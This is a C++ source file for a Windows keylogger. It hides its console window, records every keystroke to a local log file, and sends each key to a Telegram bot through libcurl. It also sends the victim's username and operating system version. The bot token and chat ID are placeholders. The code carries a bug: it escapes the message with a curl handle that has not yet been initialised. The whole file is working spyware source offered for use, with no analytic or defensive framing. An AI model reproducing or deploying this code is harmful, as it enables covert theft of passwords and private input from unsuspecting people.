#include <iostream>
#include <fstream>
#include <string>
#include <cstdlib>
#include <cstring>
#include <curl/curl.h>
#include <windows.h>
#include <conio.h>
#include <ctime>

#ifdef _WIN32
#include <lmcons.h>
#else
#include <unistd.h>
#include <sys/utsname.h>
#include <pwd.h>
#endif


void send_to_telegram(const std::string& message, const std::string& token, const std::string& chat_id) {
    CURL* curl;
    CURLcode res;

    std::string escaped_message = curl_easy_escape(curl, message.c_str(), message.length());
    std::string url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + escaped_message;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
        }
        curl_easy_cleanup(curl);
    }
}


void key_log(const std::string& token, const std::string& chat_id) {
    std::ofstream log_file("log.log", std::ios::app);
    char key;
    while (true) {
        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                key = (char)i;
                std::string key_str;

                if (i == VK_SPACE) key_str = " [SPACE] ";
                else if (i == VK_RETURN) key_str = " [ENTER] ";
                else if (i == VK_BACK) key_str = " [BACKSPACE] ";
                else if (i == VK_TAB) key_str = " [TAB] ";
                else if (i == VK_ESCAPE) key_str = " [ESC] ";
                else if (i >= 0x30 && i <= 0x39) key_str = key;
                else if (i >= 0x41 && i <= 0x5A) key_str = key;
                else key_str = " [" + std::to_string(i) + "] ";

                log_file << key_str;
                log_file.flush();

                send_to_telegram(key_str, token, chat_id);

                while (GetAsyncKeyState(i) & 0x8000) {
                    Sleep(10);
                }
            }
        }
        Sleep(10); 
    }
    log_file.close();
}

void key_start(const std::string& token, const std::string& chat_id) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    key_log(token, chat_id);
}

std::string get_system_info() {
    std::string system_info;
#ifdef _WIN32
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    system_info += "Username: " + std::string(username) + "\n";

    OSVERSIONINFO osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&osvi);
    system_info += "OS Name: Windows\n";
    system_info += "Version: " + std::to_string(osvi.dwMajorVersion) + "." + std::to_string(osvi.dwMinorVersion) + "\n";
#else
    struct passwd* pw = getpwuid(getuid());
    system_info += "Username: " + std::string(pw->pw_name) + "\n";

    struct utsname buffer;
    uname(&buffer);
    system_info += "OS Name: " + std::string(buffer.sysname) + "\n";
    system_info += "Version: " + std::string(buffer.release) + "\n";
#endif
    return system_info;
}

int main() {
    std::string token = "YOUR_TELEGRAM_BOT_TOKEN";
    std::string chat_id = "YOUR_CHAT_ID";

    std::string system_info = get_system_info();
    send_to_telegram(system_info, token, chat_id);

    key_start(token, chat_id);

    return 0;
}